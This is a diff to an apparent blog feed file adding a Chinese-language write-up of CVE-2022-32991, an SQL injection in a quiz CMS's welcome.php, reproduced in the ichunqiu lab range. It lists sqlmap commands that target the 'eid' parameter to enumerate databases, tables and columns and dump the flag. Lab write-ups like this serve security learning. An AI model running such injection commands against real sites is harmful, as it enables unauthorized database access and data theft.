@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>CVE-2022-32991</title>
+      <link href="/2023/05/09/CVE-2022-32991/"/>
+      <url>/2023/05/09/CVE-2022-32991/</url>
+      
+        <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>春秋云境：<a href="https://yunjing.ichunqiu.com/">https://yunjing.ichunqiu.com</a></p><h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>该CMS的welcome.php中存在SQL注入攻击</p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>0x01 打开环境</p><p> <img src="https://blog-1258155859.cos.ap-guangzhou.myqcloud.com/image-20230508212440176.png" alt="image-20230508212440176"></p><p>0x02 注册一个账号</p><p><img src="https://blog-1258155859.cos.ap-guangzhou.myqcloud.com/image-20230508212529225.png" alt="image-20230508212529225"></p><p>0x03 登录账号</p><p><img src="https://blog-1258155859.cos.ap-guangzhou.myqcloud.com/image-20230508212552189.png" alt="image-20230508212552189"></p><p>0x04 点击 Start</p><p><img src="https://blog-1258155859.cos.ap-guangzhou.myqcloud.com/image-20230508212622366.png" alt="image-20230508212622366"></p><p>0x05 eid 就是存在注入参数</p><p><img src="https://blog-1258155859.cos.ap-guangzhou.myqcloud.com/image-20230508212656364.png" alt="image-20230508212656364"></p><p>0x06 把URL复制下来 打开sqlmap 输入命令：python sqlmap.py -u “<a href="http://eci-2ze0wxm1gzlhda3feygs.cloudeci1.ichunqiu.com/welcome.php?q=quiz&amp;step=2&amp;eid=60377db362694&amp;n=1&amp;t=34&quot;">http://eci-2ze0wxm1gzlhda3feygs.cloudeci1.ichunqiu.com/welcome.php?q=quiz&amp;step=2&amp;eid=60377db362694&amp;n=1&amp;t=34&quot;</a> -p eid –dbs –batch –threads 10</p><p><img src="https://blog-1258155859.cos.ap-guangzhou.myqcloud.com/image-20230508213918316.png" alt="image-20230508213918316"></p><p>0x07 爆列名：python sqlmap.py -u “<a href="http://eci-2ze0wxm1gzlhda3feygs.cloudeci1.ichunqiu.com/welcome.php?q=quiz&amp;step=2&amp;eid=60377db362694&amp;n=1&amp;t=34&quot;">http://eci-2ze0wxm1gzlhda3feygs.cloudeci1.ichunqiu.com/welcome.php?q=quiz&amp;step=2&amp;eid=60377db362694&amp;n=1&amp;t=34&quot;</a> -p eid -D ctf –tables –batch –threads 10</p><p><img src="https://blog-1258155859.cos.ap-guangzhou.myqcloud.com/image-20230508213958018.png" alt="image-20230508213958018"></p><p>0x08 爆字段名：python sqlmap.py -u “<a href="http://eci-2ze0wxm1gzlhda3feygs.cloudeci1.ichunqiu.com/welcome.php?q=quiz&amp;step=2&amp;eid=60377db362694&amp;n=1&amp;t=34&quot;">http://eci-2ze0wxm1gzlhda3feygs.cloudeci1.ichunqiu.com/welcome.php?q=quiz&amp;step=2&amp;eid=60377db362694&amp;n=1&amp;t=34&quot;</a> -p eid -D ctf -T flag –columns –batch –threads 10</p><p><img src="https://blog-1258155859.cos.ap-guangzhou.myqcloud.com/image-20230508214028385.png" alt="image-20230508214028385"></p><p>0x09 爆数据：python sqlmap.py -u “<a href="http://eci-2ze0wxm1gzlhda3feygs.cloudeci1.ichunqiu.com/welcome.php?q=quiz&amp;step=2&amp;eid=60377db362694&amp;n=1&amp;t=34&quot;">http://eci-2ze0wxm1gzlhda3feygs.cloudeci1.ichunqiu.com/welcome.php?q=quiz&amp;step=2&amp;eid=60377db362694&amp;n=1&amp;t=34&quot;</a> -p eid -D ctf -T flag -C flag –dump –batch –threads 10</p><p><img src="https://blog-1258155859.cos.ap-guangzhou.myqcloud.com/image-20230508214056991.png" alt="image-20230508214056991"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 漏洞复现 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 漏洞复现 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>文件包含漏洞</title>
       <link href="/2023/02/08/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"/>
       <url>/2023/02/08/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
